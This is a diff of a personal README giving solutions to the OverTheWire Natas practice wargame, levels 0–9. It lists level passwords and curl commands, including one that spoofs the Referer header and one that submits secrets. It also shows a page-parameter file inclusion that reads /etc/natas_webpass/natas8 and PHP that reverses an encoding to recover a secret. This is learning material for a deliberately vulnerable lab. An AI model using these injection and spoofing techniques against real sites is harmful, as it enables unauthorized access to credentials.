@@ -14,21 +14,25 @@ I'm trying to solve the challenges of overthewire.org.
         user:natas`X`
         pass:*******
 
-## natas0 http://natas0.natas.labs.overthewire.org/
+## natas0
 
 - He himself gave us the username and password in overthewire.org for start HACKGAME.
 
         user:natas0
         pass:natas0
 
-## natas1 http://natas1.natas.labs.overthewire.org/
+## natas1
+
+in : http://natas0.natas.labs.overthewire.org/
 
 1. Get the page's source.
 2. Look the HTML comment.
 
         <!--The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq -->
 
-## natas2 http://natas2.natas.labs.overthewire.org/
+## natas2
+
+in : http://natas1.natas.labs.overthewire.org/
 
 - You cannot right-click.
 1. Get the page's source.
@@ -36,7 +40,9 @@ I'm trying to solve the challenges of overthewire.org.
 
         <!--The password for natas2 is TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI -->
 
-## natas3 http://natas3.natas.labs.overthewire.org/
+## natas3
+
+in : http://natas2.natas.labs.overthewire.org/
 
 - There is nothing in the page's source.
 1. Get the page's source.
@@ -56,7 +62,9 @@ I'm trying to solve the challenges of overthewire.org.
         eve:zo4mJWyNj2
         mallory:9urtcpzBmH
 
-## natas4 http://natas4.natas.labs.overthewire.org/
+## natas4
+
+in : http://natas3.natas.labs.overthewire.org/
 
 - he have comment in page's source
 
@@ -74,7 +82,9 @@ I'm trying to solve the challenges of overthewire.org.
 
         natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
 
-## natas5 http://natas5.natas.labs.overthewire.org/
+## natas5
+
+in : http://natas4.natas.labs.overthewire.org/
 
 - he has a text message :
 
@@ -88,15 +98,17 @@ I'm trying to solve the challenges of overthewire.org.
 
 2. for change referer http header, i use `curl`
 
-    i run ubuntu in windows with `wsl`
+    i run `TERMINAL`
 
-        ~$ curl -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ --referer http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org
+        curl -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ --referer http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org
 
     tada :
 
         Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
 
-## natas6 http://natas6.natas.labs.overthewire.org/
+## natas6
+
+in : http://natas5.natas.labs.overthewire.org/
 
 - he has a text message :
 
@@ -114,7 +126,9 @@ I'm trying to solve the challenges of overthewire.org.
 
         Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
 
-## natas7 http://natas7.natas.labs.overthewire.org/
+## natas7
+
+in : http://natas6.natas.labs.overthewire.org/
 
 - By clicking on `View sourcecode` a PHP script is shown
 
@@ -140,4 +154,77 @@ I'm trying to solve the challenges of overthewire.org.
 
 2. now submit form with Input secret: `FOEIUWGHFEEUHOFUOIU`
 
+   - you can submit with: `curl`
+
+    > curl -u natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned -d "secret=FOEIUWGHFEEUHOFUOIU&submit=submit" -X POST http://natas6.natas.labs.overthewire.org/
+
+    see :
+
         Access granted. The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
+
+## natas8
+
+in : http://natas7.natas.labs.overthewire.org/
+
+- he have comment in page's source
+
+        <!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
+
+1. According to the links, the pages are called as follows: `index.php?page=home`
+   
+2. So we change the value of ‍`page=home` to `page=/etc/natas_webpass/natas8`.
+
+        http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
+
+   - pass is here : `xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q`
+
+## natas9
+
+in : http://natas8.natas.labs.overthewire.org/
+
+- By clicking on `View sourcecode` a PHP script is shown
+
+        <?
+        $encodedSecret = "3d3d516343746d4d6d6c315669563362";
+
+        function encodeSecret($secret) {
+            return bin2hex(strrev(base64_encode($secret)));
+        }
+
+        if(array_key_exists("submit", $_POST)) {
+            if(encodeSecret($_POST['secret']) == $encodedSecret) {
+            print "Access granted. The password for natas9 is <censored>";
+            } else {
+            print "Wrong secret";
+            }
+        }
+        ?>
+
+1. What these commands say is that the value of `secret` must be equal to the encrypted value `3d3d516343746d4d6d6c315669563362` or `$encodedSecret`.
+
+- On the other hand, it encrypts the value we send with the `encodeSecret` function `bin2hex(strrev(base64_encode($secret)))`, so we just need to reverse the encryption steps.
+
+- To do this, first we extract the value `3d3d516343746d4d6d6c315669563362` from hex `hex2bin()`, then we need to write all the letters in reverse with `strrev()` and decode it with base64 with the `base64_decode()` function.
+
+2. To do this, if you don't have `php`, you can use online compilers and run the following code to get the secret.
+
+        <?php
+        $secret = "3d3d516343746d4d6d6c315669563362";
+        echo base64_decode(strrev(hex2bin($secret))) ;
+        ?>
+
+    - This program returns the result: `oubWYf2kBq`
+  
+3. Now you can enter it as the `secret` value.
+
+   - you can submit with: `curl`
+
+    > curl -u natas8:xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q -d "secret=oubWYf2kBq&submit=submit" -X POST http://natas8.natas.labs.overthewire.org/
+
+    You found it:
+
+        Access granted. The password for natas9 is ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
+
+## natas10
+
+in : http://natas9.natas.labs.overthewire.org/
